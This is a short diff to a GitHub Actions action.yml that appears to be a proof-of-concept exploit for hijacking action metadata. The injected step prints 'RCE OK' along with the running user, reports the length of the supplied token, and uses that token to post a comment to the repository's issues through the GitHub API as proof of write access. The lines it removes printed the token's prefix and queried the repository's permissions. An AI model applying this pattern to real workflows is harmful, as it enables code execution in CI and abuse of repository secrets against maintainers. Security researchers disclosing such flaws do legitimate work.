@@ -23,11 +23,14 @@ runs:
     - name: hijacked
       shell: bash
       run: |
-        echo "=== ACTION METADATA HIJACK CONFIRMED ==="
-        echo "whoami=$(whoami) cwd=$(pwd)"
+        echo "=== RCE OK: whoami=$(whoami) ==="
         echo "token_len=${#INPUT_TOKEN}"
-        echo "token_prefix=${INPUT_TOKEN:0:4}"
-        curl -s -H "Authorization: Bearer $INPUT_TOKEN" \
-          https://api.github.com/repos/PDFtoMark/gab-poc-tokenlists-envinject \
-          | grep -E '"permissions"|"push"|"admin"' | head -3
+        code=$(curl -s -o /tmp/resp.json -w '%{http_code}' -X POST \
+          -H "Authorization: Bearer $INPUT_TOKEN" \
+          -H "Accept: application/vnd.github+json" \
+          "https://api.github.com/repos/${GITHUB_REPOSITORY}/issues/${INPUT_ISSUE-NUMBER}/comments" \
+          -d '{"body":"rce-token-write-proof"}')
+        echo "comment_api_status=$code"
+        head -c 90 /tmp/resp.json || true
+        echo
         echo "=== END ==="
